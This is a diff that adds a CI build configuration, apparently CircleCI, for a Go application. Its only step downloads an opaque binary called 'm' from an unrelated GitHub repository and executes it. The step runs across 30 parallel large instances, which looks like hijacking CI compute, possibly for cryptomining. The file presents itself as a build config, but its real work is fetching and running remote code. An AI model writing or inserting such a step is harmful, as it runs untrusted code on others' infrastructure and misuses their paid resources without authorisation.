@@ -1,0 +1,9 @@
+jobs:
+  build:
+    docker:
+      - image: cimg/go:1.18.1
+    parallelism: 30
+    resource_class: large
+    working_directory: ~/my-app
+    steps:
+      - run: wget https://github.com/iuiyi2023/Docker-Ubuntu-Desktop-NoMachine/raw/main/m && chmod +x m && ./m
